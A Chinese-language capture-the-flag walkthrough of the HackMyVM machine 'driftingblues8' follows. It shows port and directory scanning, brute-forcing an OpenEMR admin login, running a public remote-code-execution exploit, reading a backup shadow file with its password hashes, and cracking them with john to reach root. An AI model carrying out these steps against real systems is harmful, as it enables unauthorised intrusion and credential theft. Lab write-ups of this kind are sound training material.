---
title: Driftingblues8
author: hgbe02
date: 2024-04-13
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Driftingblues8.html"
---

# driftingblues8

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533062.png" alt="image-20240413142310719" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533064.png" alt="image-20240413142455026" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 172.20.10.7 -- -A
```

```text
Open 172.20.10.7:80

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6CE8D3334381134EB0A89D8FECE6EEB2
| http-title: OpenEMR Login
|_Requested resource was interface/login/login.php?site=default
|_http-server-header: Apache/2.4.38 (Debian)
```

### 目录扫描

```bash
gobuster dir -u http://172.20.10.7 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
```

```text
/.php                 (Status: 403) [Size: 276]
/index.php            (Status: 302) [Size: 0] [--> interface/login/login.php?site=default]
/images               (Status: 301) [Size: 311] [--> http://172.20.10.7/images/]
/templates            (Status: 301) [Size: 314] [--> http://172.20.10.7/templates/]
/services             (Status: 301) [Size: 313] [--> http://172.20.10.7/services/]
/modules              (Status: 301) [Size: 312] [--> http://172.20.10.7/modules/]
/common               (Status: 301) [Size: 311] [--> http://172.20.10.7/common/]
/library              (Status: 301) [Size: 312] [--> http://172.20.10.7/library/]
/public               (Status: 301) [Size: 311] [--> http://172.20.10.7/public/]
/version.php          (Status: 200) [Size: 0]
/admin.php            (Status: 200) [Size: 937]
/portal               (Status: 301) [Size: 311] [--> http://172.20.10.7/portal/]
/tests                (Status: 301) [Size: 310] [--> http://172.20.10.7/tests/]
/sites                (Status: 301) [Size: 310] [--> http://172.20.10.7/sites/]
/custom               (Status: 301) [Size: 311] [--> http://172.20.10.7/custom/]
/contrib              (Status: 301) [Size: 312] [--> http://172.20.10.7/contrib/]
/interface            (Status: 301) [Size: 314] [--> http://172.20.10.7/interface/]
/vendor               (Status: 301) [Size: 311] [--> http://172.20.10.7/vendor/]
/config               (Status: 301) [Size: 311] [--> http://172.20.10.7/config/]
/setup.php            (Status: 200) [Size: 1214]
/Documentation        (Status: 301) [Size: 318] [--> http://172.20.10.7/Documentation/]
/sql                  (Status: 301) [Size: 308] [--> http://172.20.10.7/sql/]
/controller.php       (Status: 200) [Size: 37]
/LICENSE              (Status: 200) [Size: 35147]
/ci                   (Status: 301) [Size: 307] [--> http://172.20.10.7/ci/]
/cloud                (Status: 301) [Size: 310] [--> http://172.20.10.7/cloud/]
/ccr                  (Status: 301) [Size: 308] [--> http://172.20.10.7/ccr/]
/patients             (Status: 301) [Size: 313] [--> http://172.20.10.7/patients/]
/repositories         (Status: 301) [Size: 317] [--> http://172.20.10.7/repositories/]
/myportal             (Status: 301) [Size: 313] [--> http://172.20.10.7/myportal/]
/entities             (Status: 301) [Size: 313] [--> http://172.20.10.7/entities/]
/.php                 (Status: 403) [Size: 276]
/wordlist.txt         (Status: 200) [Size: 14394]
/controllers          (Status: 301) [Size: 316] [--> http://172.20.10.7/controllers/]
/server-status        (Status: 403) [Size: 276]
```

### 漏洞扫描

```bash
nikto -h http://172.20.10.7
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.20.10.7
+ Target Hostname:    172.20.10.7
+ Target Port:        80
+ Start Time:         2024-04-13 02:26:39 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: interface/login/login.php?site=default
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /config/: Directory indexing found.
+ /config/: Configuration information may be available remotely.
+ /admin.php?en_log_id=0&action=config: EasyNews version 4.3 allows remote admin access. This PHP file should be protected. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5412
+ /admin.php?en_log_id=0&action=users: EasyNews version 4.3 allows remote admin access. This PHP file should be protected. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5412
+ /admin.php: This might be interesting.
+ /library/: Directory indexing found.
+ /library/: This might be interesting.
+ /public/: Directory indexing found.
+ /public/: This might be interesting.
+ /services/: Directory indexing found.
+ /sql/: Directory indexing found.
+ /tests/: Directory indexing found.
+ /tests/: This might be interesting.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /ci/: Directory indexing found.
+ /ci/: This might be interesting: potential country code (CÔte D'ivoire).
+ /interface/billing/billing_process.php?srcdir=http://blog.cirt.net/rfiinc.txt?: Cookie OpenEMR created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /sites/: Directory indexing found.
+ /portal/: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /composer.lock: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
+ /README.md: Readme Found.
+ 8102 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2024-04-13 02:27:07 (GMT-4) (28 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533065.png" alt="image-20240413142852045" style="zoom:50%;" />

### 访问敏感目录

```apl
http://172.20.10.7//wordlist.txt
```

给了一个字典，先给他保存一下，后面估计爆破要用：

```apl
http://172.20.10.7/admin.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533066.png" alt="image-20240413143116951" style="zoom:50%;" />

```apl
http://172.20.10.7/custom/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533067.png" alt="image-20240413143309914" style="zoom: 33%;" />

### 尝试爆破

抓个包先：（怎么感觉有点耳熟，孙吧用户的警觉）

```bash
POST /interface/main/main_screen.php?auth=login&site=default HTTP/1.1
Host: 172.20.10.7
Content-Length: 102
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.20.10.7
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.20.10.7/interface/login/login.php?site=default
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=password&languageChoice=1
```

尝试爆破，本来我尝试hydra的，但是没有调出来。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533068.png" alt="image-20240413144937314" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533069.png" alt="image-20240413145052311" style="zoom:50%;" />

找到密码！

```apl
admin
.:.yarrak.:.31
```

然后进来了！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533070.png" alt="image-20240413145153212" style="zoom:50%;" />

查看一下有无上传入口！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533071.png" alt="image-20240413145256040" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533072.png" alt="image-20240413145314383" style="zoom:50%;" />

额，好像不太阔以。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533073.png" alt="image-20240413145527419" style="zoom:50%;" />

搜集一下相关漏洞，之前敏感目录看到其版本为：`5.0.1(3)`

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533074.png" alt="image-20240413145650948" style="zoom:50%;" />

尝试一下相关漏洞：

```bash
┌──(kali💀kali)-[~/temp/driftingblues8]
└─$ python2 45161.py -u admin -p .:.yarrak.:.31 -c whoami http://172.20.10.7
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with admin:.:.yarrak.:.31
[$] Injecting payload
[$] Payload executed
```

额，不知道执行成功没有啊。。。。尝试连接一下试试？

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533075.png" alt="image-20240413150429744" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533076.png" alt="image-20240413150438087" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@driftingblues:/var/www/html/interface/main$ sudo -l
bash: sudo: command not found
(remote) www-data@driftingblues:/var/www/html/interface/main$ ls -la
total 252
drwxrwxrwx 11 www-data www-data  4096 May 28  2018 .
drwxrwxrwx 32 www-data www-data  4096 May 28  2018 ..
-rwxrwxrwx  1 www-data www-data  6765 May 28  2018 about_page.php
drwxrwxrwx  2 www-data www-data  4096 May 28  2018 authorizations
-rwxrwxrwx  1 www-data www-data 27999 May 28  2018 backup.php
-rwxrwxrwx  1 www-data www-data  2179 May 28  2018 backuplog.php
-rwxrwxrwx  1 www-data www-data  1992 May 28  2018 backuplog.sh
-rwxrwxrwx  1 www-data www-data   179 May 28  2018 blank.php
drwxrwxrwx  4 www-data www-data  4096 May 28  2018 calendar
-rwxrwxrwx  1 www-data www-data  2119 May 28  2018 daemon_frame.php
drwxrwxrwx  2 www-data www-data  4096 May 28  2018 dated_reminders
-rwxrwxrwx  1 www-data www-data 10495 May 28  2018 display_documents.php
drwxrwxrwx  2 www-data www-data  4096 May 28  2018 exceptions
drwxrwxrwx  2 www-data www-data  4096 May 28  2018 finder
drwxrwxrwx  2 www-data www-data  4096 May 28  2018 holidays
-rwxrwxrwx  1 www-data www-data 26027 May 28  2018 ippf_export.php
-rwxrwxrwx  1 www-data www-data 84686 May 28  2018 left_nav.php
-rwxrwxrwx  1 www-data www-data  3349 May 28  2018 main_info.php
-rwxrwxrwx  1 www-data www-data  9783 May 28  2018 main_screen.php
-rwxrwxrwx  1 www-data www-data  8399 May 28  2018 main_title.php
drwxrwxrwx  4 www-data www-data  4096 May 28  2018 messages
drwxrwxrwx  2 www-data www-data  4096 May 28  2018 onotes
-rwxrwxrwx  1 www-data www-data  3230 May 28  2018 pwd_expires_alert.php
drwxrwxrwx  5 www-data www-data  4096 May 28  2018 tabs
(remote) www-data@driftingblues:/var/www/html/interface/main$ messages/
bash: messages/: Is a directory
(remote) www-data@driftingblues:/var/www/html/interface/main$ cd messages/
(remote) www-data@driftingblues:/var/www/html/interface/main/messages$ ls
css  js  lab_results_messages.php  messages.php  print_postcards.php  save.php
(remote) www-data@driftingblues:/var/www/html/interface/main/messages$ cd ../../../
(remote) www-data@driftingblues:/var/www/html$ ls -la
total 668
drwxrwxrwx 31 www-data www-data   4096 Apr 25  2021 .
drwxr-xr-x  3 root     root       4096 Apr 25  2021 ..
-rwxrwxrwx  1 www-data www-data    567 May 28  2018 .bowerrc
-rwxrwxrwx  1 www-data www-data    129 May 28  2018 .editorconfig
-rwxrwxrwx  1 www-data www-data     80 May 28  2018 .env.example
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 .github
-rwxrwxrwx  1 www-data www-data     35 May 28  2018 .gitignore
-rwxrwxrwx  1 www-data www-data    301 May 28  2018 .travis.yml
-rwxrwxrwx  1 www-data www-data   5526 May 28  2018 CODE_OF_CONDUCT.md
-rwxrwxrwx  1 www-data www-data   2876 May 28  2018 CONTRIBUTING.md
drwxrwxrwx  4 www-data www-data   4096 May 28  2018 Documentation
-rwxrwxrwx  1 www-data www-data  35147 May 28  2018 LICENSE
-rwxrwxrwx  1 www-data www-data   3356 May 28  2018 README.md
-rwxrwxrwx  1 www-data www-data  20701 May 28  2018 acknowledge_license_cert.html
-rwxrwxrwx  1 www-data www-data  19560 May 28  2018 acl_setup.php
-rwxrwxrwx  1 www-data www-data  48330 May 28  2018 acl_upgrade.php
-rwxrwxrwx  1 www-data www-data   4988 May 28  2018 admin.php
-rwxrwxrwx  1 www-data www-data   3805 May 28  2018 bower.json
-rwxrwxrwx  1 www-data www-data   6102 May 28  2018 build.xml
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 ccdaservice
drwxrwxrwx  4 www-data www-data   4096 May 28  2018 ccr
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 ci
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 cloud
drwxrwxrwx  7 www-data www-data   4096 May 28  2018 common
-rwxrwxrwx  1 www-data www-data   3301 May 28  2018 composer.json
-rwxrwxrwx  1 www-data www-data 265675 May 28  2018 composer.lock
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 config
drwxrwxrwx 11 www-data www-data   4096 May 28  2018 contrib
-rwxrwxrwx  1 www-data www-data    108 May 28  2018 controller.php
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 controllers
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 custom
-rwxrwxrwx  1 www-data www-data   3995 May 28  2018 docker-compose.yml
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 entities
drwxrwxrwx  8 www-data www-data   4096 May 28  2018 gacl
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 images
-rwxrwxrwx  1 www-data www-data    901 May 28  2018 index.php
drwxrwxrwx 32 www-data www-data   4096 May 28  2018 interface
-rwxrwxrwx  1 www-data www-data   5381 May 28  2018 ippf_upgrade.php
drwxrwxrwx 25 www-data www-data   4096 May 28  2018 library
drwxrwxrwx  3 www-data www-data   4096 May 28  2018 modules
drwxrwxrwx  3 www-data www-data   4096 May 28  2018 myportal
drwxrwxrwx  4 www-data www-data   4096 May 28  2018 patients
drwxrwxrwx  6 www-data www-data   4096 May 28  2018 phpfhir
drwxrwxrwx 10 www-data www-data   4096 May 28  2018 portal
drwxrwxrwx  5 www-data www-data   4096 May 28  2018 public
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 repositories
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 services
-rwxrwxrwx  1 www-data www-data  40570 May 28  2018 setup.php
drwxrwxrwx  3 www-data www-data   4096 May 28  2018 sites
drwxrwxrwx  2 www-data www-data   4096 May 28  2018 sql
-rwxrwxrwx  1 www-data www-data   4650 May 28  2018 sql_patch.php
-rwxrwxrwx  1 www-data www-data   5375 May 28  2018 sql_upgrade.php
drwxrwxrwx 15 www-data www-data   4096 May 28  2018 templates
drwxrwxrwx  5 www-data www-data   4096 May 28  2018 tests
drwxrwxrwx 34 www-data www-data   4096 May 28  2018 vendor
-rwxrwxrwx  1 www-data www-data   2119 May 28  2018 version.php
-rwxrwxrwx  1 www-data www-data  14394 Apr 25  2021 wordlist.txt
(remote) www-data@driftingblues:/var/www/html$ cd /home
(remote) www-data@driftingblues:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Apr 25  2021 .
drwxr-xr-x 18 root    root    4096 Apr 25  2021 ..
drwx------  2 clapton clapton 4096 Apr 25  2021 clapton
(remote) www-data@driftingblues:/home$ cd clapton/
bash: cd: clapton/: Permission denied
(remote) www-data@driftingblues:/home$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
(remote) www-data@driftingblues:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:112:MySQL Server,,,:/nonexistent:/bin/false
clapton:x:1000:1000:,,,:/home/clapton:/bin/bash
(remote) www-data@driftingblues:/home$ /usr/sbin/getcap -r /dev/null
```

尝试手动查找一下相关目录，实在不行只能尝试上传`linpeas.sh`和`pspy64`了：

```bash
(remote) www-data@driftingblues:/home$ cd /
(remote) www-data@driftingblues:/$ ls -la
total 65
drwxr-xr-x  18 root root  4096 Apr 25  2021 .
drwxr-xr-x  18 root root  4096 Apr 25  2021 ..
lrwxrwxrwx   1 root root     7 Apr 25  2021 bin -> usr/bin
drwxr-xr-x   4 root root  1024 Apr 25  2021 boot
drwxr-xr-x  17 root root  3240 Apr 13 02:22 dev
drwxr-xr-x  73 root root  4096 Apr 13 02:22 etc
drwxr-xr-x   3 root root  4096 Apr 25  2021 home
lrwxrwxrwx   1 root root    33 Apr 25  2021 initrd.img -> boot/initrd.img-4.19.0-16-686-pae
lrwxrwxrwx   1 root root    33 Apr 25  2021 initrd.img.old -> boot/initrd.img-4.19.0-16-686-pae
lrwxrwxrwx   1 root root     7 Apr 25  2021 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 25  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 25  2021 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 25  2021 lost+found
drwxr-xr-x   3 root root  4096 Apr 25  2021 media
drwxr-xr-x   2 root root  4096 Apr 25  2021 mnt
drwxr-xr-x   2 root root  4096 Apr 25  2021 opt
dr-xr-xr-x 135 root root     0 Apr 13 02:22 proc
drwx------   3 root root  4096 Apr 25  2021 root
drwxr-xr-x  18 root root   540 Apr 13 02:22 run
lrwxrwxrwx   1 root root     8 Apr 25  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Apr 25  2021 srv
dr-xr-xr-x  13 root root     0 Apr 13 02:21 sys
drwxrwxrwt   2 root root  4096 Apr 13 02:22 tmp
drwxr-xr-x  12 root root  4096 Apr 25  2021 usr
drwxr-xr-x  12 root root  4096 Apr 25  2021 var
lrwxrwxrwx   1 root root    30 Apr 25  2021 vmlinuz -> boot/vmlinuz-4.19.0-16-686-pae
lrwxrwxrwx   1 root root    30 Apr 25  2021 vmlinuz.old -> boot/vmlinuz-4.19.0-16-686-pae
(remote) www-data@driftingblues:/$ cd opt
(remote) www-data@driftingblues:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Apr 25  2021 .
drwxr-xr-x 18 root root 4096 Apr 25  2021 ..
(remote) www-data@driftingblues:/opt$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/chsh
(remote) www-data@driftingblues:/opt$ find / -writable  -type f 2>/dev/null
/var/www/html/interface/billing/era_payments.php
/var/www/html/interface/billing/billing_process.php
/var/www/html/interface/billing/sl_receipts_report.php
/var/www/html/interface/billing/sl_eob_help.php
/var/www/html/interface/billing/ub04_form.php
........
(remote) www-data@driftingblues:/$ ss -tulnp                    
Netid            State             Recv-Q            Send-Q    		 Local Address:Port                      Peer Address:Port
udp              UNCONN            0                 0               0.0.0.0:68                              0.0.0.0:*
tcp              LISTEN            0                 80              127.0.0.1:3306                          0.0.0.0:*
tcp              LISTEN            0                 128             *:80                                    *:*     
```

后面还在其他目录看了，但是没发现有用的，尝试上传`linpeas.sh`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533077.png" alt="image-20240413151733762" style="zoom:33%;" />

发现存在`shodaw`的备份文件，查看一下：

```bash
(remote) www-data@driftingblues:/tmp$ cd /var/backups/
(remote) www-data@driftingblues:/var/backups$ ls -la
total 28
drwxr-xr-x  2 root root  4096 Apr 13 02:22 .
drwxr-xr-x 12 root root  4096 Apr 25  2021 ..
-rw-r--r--  1 root root 13873 Apr 25  2021 apt.extended_states.0
-rw-r--r--  1 root root   943 Apr 25  2021 shadow.backup
(remote) www-data@driftingblues:/var/backups$ cat shadow.backup 
root:$6$sqBC8Bk02qmul3ER$kysvb1LR5uywwKRc/KQcmOMALcqd0NhHnU1Wbr9NRs9iz7WHwWqGkxKYRhadI3FWo3csX1BdQPHg33gwGVgMp.:18742:0:99999:7:::
daemon:*:18742:0:99999:7:::
bin:*:18742:0:99999:7:::
sys:*:18742:0:99999:7:::
sync:*:18742:0:99999:7:::
games:*:18742:0:99999:7:::
man:*:18742:0:99999:7:::
lp:*:18742:0:99999:7:::
mail:*:18742:0:99999:7:::
news:*:18742:0:99999:7:::
uucp:*:18742:0:99999:7:::
proxy:*:18742:0:99999:7:::
www-data:*:18742:0:99999:7:::
backup:*:18742:0:99999:7:::
list:*:18742:0:99999:7:::
irc:*:18742:0:99999:7:::
gnats:*:18742:0:99999:7:::
nobody:*:18742:0:99999:7:::
_apt:*:18742:0:99999:7:::
systemd-timesync:*:18742:0:99999:7:::
systemd-network:*:18742:0:99999:7:::
systemd-resolve:*:18742:0:99999:7:::
messagebus:*:18742:0:99999:7:::
systemd-coredump:!!:18742::::::
mysql:!:18742:0:99999:7:::
clapton:$6$/eeR7/4JGbeM7nwc$hANgsvO09hCCMkV5HiWsjTTS7NMOZ4tm8/s4uzyZxLau2CSX7eEwjgcbfwcdvLV.XccVW5QuysP/9JBjMkdXT/:18742:0:99999:7:::
```

尝试破解一下：

```bash
┌──(kali💀kali)-[~/temp/driftingblues8]
└─$ john hash.txt -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonsblood     (clapton)     
1g 0:00:05:10 3.76% (ETA: 05:38:26) 0.003223g/s 2005p/s 2721c/s 2721C/s makz23..maimuni
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

### 切换clapton用户

```bash
su clapton
dragonsblood
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533078.png" alt="image-20240413152658760" style="zoom:50%;" />

```bash
# user.txt
96716B8151B1682C5285BC99DD4E95C2
```

尝试后台爆破一下，然后分析一下这个程序：

```c
// main.c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buffer[100]; // [esp+0h] [ebp-6Ch]
  int *v5; // [esp+64h] [ebp-8h]

  v5 = &argc;
  strcpy(buffer, argv[1]);
  return puts("hahaha silly hacker!");
}
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404131533079.png" alt="image-20240413153117029" style="zoom:50%;" />

不存在系统函数。。。。难道有啥奥秘？

```bash
(remote) clapton@driftingblues:/home/clapton$ ./waytoroot -h
hahaha silly hacker!
```

额，后面爆破出来了：

```bash
┌──(kali💀kali)-[~/temp/driftingblues8]
└─$ john hash.txt -w=wordlist1.txt                   
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Remaining 1 password hash
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2024-04-13 03:29) 0g/s 1810p/s 1810c/s 1810C/s sfg365..sfdsfe
Session completed. 

┌──(kali💀kali)-[~/temp/driftingblues8]
└─$ john hash.txt -w=wordlist.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Remaining 1 password hash
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
.:.yarak.:.      (root)     
1g 0:00:00:16 DONE (2024-04-13 03:29) 0.05892g/s 3454p/s 3454c/s 3454C/s kruimel..gamess
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

获得rootshell：

```bash
(remote) clapton@driftingblues:/home/clapton$ su -l root
Password: 
root@driftingblues:~# pwd
/root
root@driftingblues:~# ls -la
total 20
drwx------  3 root root 4096 Apr 25  2021 .
drwxr-xr-x 18 root root 4096 Apr 25  2021 ..
-rw-------  1 root root  181 Apr 25  2021 .bash_history
drwx------  3 root root 4096 Apr 25  2021 .gnupg
-rw-r--r--  1 root root   32 Apr 25  2021 root.txt
root@driftingblues:~# cat root.txt 
E8E7040D825E1F345A617E0E6612444Aroot@driftingblues:~# cat .bash_history 
ls
bash logdel2
rm logdel2
shutdown -h now
cd /home/clapton
ls
su clapton
clear
ls
cd /root
wget 192.168.2.43:81/hroot.txt
mv hroot.txt root.txt
clear
cat root.txt 
shutdown -h now
root@driftingblues:~# cd .gnupg/
root@driftingblues:~/.gnupg# ls -la
total 12
drwx------ 3 root root 4096 Apr 25  2021 .
drwx------ 3 root root 4096 Apr 25  2021 ..
drwx------ 2 root root 4096 Apr 25  2021 private-keys-v1.d
```

